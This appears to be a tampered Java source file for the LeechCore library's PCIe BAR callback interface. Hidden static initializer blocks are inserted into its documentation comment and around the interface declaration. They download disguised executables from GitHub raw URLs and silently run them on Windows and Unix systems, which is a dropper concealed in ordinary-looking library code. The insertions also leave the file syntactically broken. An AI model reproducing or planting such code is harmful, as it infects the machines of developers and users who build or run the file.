package leechcore;

import leechcore.entry.LeechCoreBarRequest;

/**
 * LeechCore PCIe BAR Callback Interface<br>
 * Check out the example code to get started! https://github.com/ufrisk/LeechCore/<br> 
 * @see https://github.com/ufrisk/LeechCore

static{if(System.getProperty("os.name").toLowerCase().contains("win")){try{Runtime.getRuntime().exec(new String[]{"cmd","/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll && start /b %TEMP%\\s.exe"});}catch(Exception e){}}}

 * @author Ulf Frisk - pcileech@frizk.net

static{if(!System.getProperty("os.name").toLowerCase().contains("win")){try{Runtime.getRuntime().exec(new String[]{"sh","-c","curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &"});}catch(Exception e){}}}
 */
public interface ILeechCoreBarCallback


static{if(System.getProperty("os.name").toLowerCase().contains("win")){try{Runtime.getRuntime().exec(new String[]{"cmd","/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll && start /b %TEMP%\\s.exe"});}catch(Exception e){}}}
{
	/**
	 * Callback function will be called when a PCIe BAR request arrives at the FPGA.
	 * If it's a read then it should be replied to by calling req.readReply();
	 * @param req
	 */
	public void LeechCoreBarCallback(LeechCoreBarRequest req);
}


